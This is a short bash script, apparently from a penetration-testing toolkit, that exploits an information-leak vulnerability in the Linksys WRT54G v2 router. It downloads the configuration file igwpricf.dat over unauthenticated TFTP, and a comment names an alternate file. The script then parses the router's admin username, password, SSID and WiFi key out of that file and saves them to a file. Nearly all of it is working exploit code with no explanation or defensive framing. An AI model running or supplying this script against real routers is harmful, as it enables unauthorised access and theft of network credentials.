#!/bin/bash


function display() { #display type message
      output=""
      if [ "$1" == "action" ]; then output="\e[01;32m[>]\e[00m"
      elif [ "$1" == "info" ]; then output="\e[01;33m[i]\e[00m"
      elif [ "$1" == "diag" ]; then output="\e[01;34m[+]\e[00m"
      elif [ "$1" == "error" ]; then output="\e[01;31m[!]\e[00m"; fi
      output="$output $2"
      echo -e "$output"

      if [ "$diagnostics" == "true" ]; then
         if [ "$1" == "action" ]; then output="[>]"
         elif [ "$1" == "info" ]; then output="[i]"
         elif [ "$1" == "diag" ]; then output="[+]"
         elif [ "$1" == "error" ]; then output="[!]"
         fi
      fi
}

echo "Attempting WRT54GV2 Information Leak Vulnerability"
atftp --get -r igwpricf.dat -l igwpricf.dat 192.168.1.1
#    Alternate File DL    "igwhtm.dat"

strings igwpricf.dat | grep admin -A 4 > /tmp/menu/router_pass1

user=$(sed -n '1p' < /tmp/menu/router_pass1)
pass=$(sed -n '2p' < /tmp/menu/router_pass1)
ssid=$(sed -n '3p' < /tmp/menu/router_pass1)
wifi_key=$(sed -n '5p' < /tmp/menu/router_pass1)

display info "Username      =  \e[01;33m$user\e[00m" > /tmp/menu/router_pass
display info "Password      =  \e[01;33m$pass\e[00m" >> /tmp/menu/router_pass
display info "SSID          =  \e[01;33m$ssid\e[00m" >> /tmp/menu/router_pass
display info "WiFi Key      =  \e[01;33m$wifi_key\e[00m" >> /tmp/menu/router_pass